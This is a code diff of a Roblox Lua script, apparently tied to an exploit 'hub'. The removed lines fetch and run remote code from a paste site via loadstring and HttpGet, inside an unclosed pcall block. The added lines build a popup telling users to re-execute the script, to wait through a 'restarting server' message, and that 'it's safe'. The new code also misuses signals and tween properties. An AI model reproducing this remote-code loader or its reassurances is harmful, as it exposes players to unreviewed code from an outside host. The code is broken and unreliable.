@@ -1,30 +1,144 @@
--- Create warning GUI immediately and ensure it's on top
-local gui = Instance.new("ScreenGui")
-gui.Name = "ReconnectWarningGui"
-gui.ResetOnSpawn = false
-gui.IgnoreGuiInset = true
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Global -- Ensure stacking works
-gui.Parent = game:GetService("CoreGui") -- Use CoreGui to stay on top of all GUI
+-- Roblox Studio Warning Script
+-- Place this in ServerScriptService or StarterPlayerScripts
 
-local label = Instance.new("TextLabel")
-label.Name = "WarningLabel"
-label.Size = UDim2.new(0, 480, 0, 30)
-label.Position = UDim2.new(1, -490, 0, 10) -- Top right corner
-label.BackgroundColor3 = Color3.fromRGB(255, 85, 85)
-label.BackgroundTransparency = 0.15
-label.BorderSizePixel = 0
-label.Text = "⚠ NOTE: IF IT RECONNECTS, JUST WAIT PATIENTLY"
-label.TextColor3 = Color3.new(1, 1, 1)
-label.TextStrokeTransparency = 0.5
-label.TextScaled = true
-label.Font = Enum.Font.GothamBold
-label.ZIndex = 9999 -- Make sure it's always on top
-label.Parent = gui
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
 
--- Load external FreezeMooncat script AFTER the warning is on screen
-local success, err = pcall(function()
-    loadstring(game:HttpGet("https://pastefy.app/SKC4HIK7/raw"))()
-
-if not success then
-    warn("Failed to load FreezeMooncat script: " .. tostring(err))
+-- Function to create warning GUI
+local function createWarningGUI(player)
+    local playerGui = player:WaitForChild("PlayerGui")
+    
+    -- Create ScreenGui
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "WarningGui"
+    screenGui.Parent = playerGui
+    
+    -- Create main frame
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "WarningFrame"
+    mainFrame.Size = UDim2.new(0, 400, 0, 200)
+    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -100)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Parent = screenGui
+    
+    -- Add corner radius
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = mainFrame
+    
+    -- Create warning icon
+    local warningIcon = Instance.new("TextLabel")
+    warningIcon.Name = "WarningIcon"
+    warningIcon.Size = UDim2.new(0, 30, 0, 30)
+    warningIcon.Position = UDim2.new(0, 20, 0, 20)
+    warningIcon.BackgroundTransparency = 1
+    warningIcon.Text = "⚠️"
+    warningIcon.TextColor3 = Color3.fromRGB(255, 255, 0)
+    warningIcon.TextScaled = true
+    warningIcon.Font = Enum.Font.SourceSansBold
+    warningIcon.Parent = mainFrame
+    
+    -- Create title
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Name = "TitleLabel"
+    titleLabel.Size = UDim2.new(1, -70, 0, 30)
+    titleLabel.Position = UDim2.new(0, 60, 0, 20)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = "SCRIPT EXECUTION WARNING"
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    titleLabel.TextScaled = true
+    titleLabel.Font = Enum.Font.SourceSansBold
+    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    titleLabel.Parent = mainFrame
+    
+    -- Create warning message
+    local messageLabel = Instance.new("TextLabel")
+    messageLabel.Name = "MessageLabel"
+    messageLabel.Size = UDim2.new(1, -40, 0, 80)
+    messageLabel.Position = UDim2.new(0, 20, 0, 60)
+    messageLabel.BackgroundTransparency = 1
+    messageLabel.Text = "If the hub/script doesn't appear, just execute it again. If it says 'restarting server', just wait for it to rejoin. This is only a reminder, no worries it's safe."
+    messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    messageLabel.TextScaled = true
+    messageLabel.Font = Enum.Font.SourceSans
+    messageLabel.TextWrapped = true
+    messageLabel.Parent = mainFrame
+    
+    -- Create OK button
+    local okButton = Instance.new("TextButton")
+    okButton.Name = "OkButton"
+    okButton.Size = UDim2.new(0, 100, 0, 30)
+    okButton.Position = UDim2.new(0.5, -50, 1, -50)
+    okButton.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
+    okButton.BorderSizePixel = 0
+    okButton.Text = "OK"
+    okButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    okButton.TextScaled = true
+    okButton.Font = Enum.Font.SourceSansBold
+    okButton.Parent = mainFrame
+    
+    -- Add corner radius to button
+    local buttonCorner = Instance.new("UICorner")
+    buttonCorner.CornerRadius = UDim.new(0, 4)
+    buttonCorner.Parent = okButton
+    
+    -- Button click animation and close
+    okButton.MouseButton1Click:Connect(function()
+        local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+        local tween = TweenService:Create(screenGui, tweenInfo, {
+            Enabled = false
+        })
+        tween:Play()
+        
+        tween.Completed:Connect(function()
+            screenGui:Destroy()
+        end)
+    end)
+    
+    -- Fade in animation
+    mainFrame.BackgroundTransparency = 1
+    warningIcon.TextTransparency = 1
+    titleLabel.TextTransparency = 1
+    messageLabel.TextTransparency = 1
+    okButton.BackgroundTransparency = 1
+    okButton.TextTransparency = 1
+    
+    local fadeInTween = TweenService:Create(mainFrame, TweenInfo.new(0.3), {BackgroundTransparency = 0})
+    local iconTween = TweenService:Create(warningIcon, TweenInfo.new(0.3), {TextTransparency = 0})
+    local titleTween = TweenService:Create(titleLabel, TweenInfo.new(0.3), {TextTransparency = 0})
+    local messageTween = TweenService:Create(messageLabel, TweenInfo.new(0.3), {TextTransparency = 0})
+    local buttonBgTween = TweenService:Create(okButton, TweenInfo.new(0.3), {BackgroundTransparency = 0})
+    local buttonTextTween = TweenService:Create(okButton, TweenInfo.new(0.3), {TextTransparency = 0})
+    
+    fadeInTween:Play()
+    iconTween:Play()
+    titleTween:Play()
+    messageTween:Play()
+    buttonBgTween:Play()
+    buttonTextTween:Play()
+    
+    -- Auto-close after 10 seconds
+    wait(10)
+    if screenGui and screenGui.Parent then
+        okButton.MouseButton1Click:Fire()
+    end
 end
+
+-- Show warning for all players
+local function onPlayerAdded(player)
+    wait(1) -- Small delay to ensure PlayerGui is ready
+    createWarningGUI(player)
+end
+
+-- Connect to player joining
+Players.PlayerAdded:Connect(onPlayerAdded)
+
+-- Show warning for players already in game
+for _, player in pairs(Players:GetPlayers()) do
+    spawn(function()
+        onPlayerAdded(player)
+    end)
+end
+
+print("Warning script loaded - If the hub/script doesn't appear, just execute it again. If it says 'restarting server', just wait for it to rejoin.")
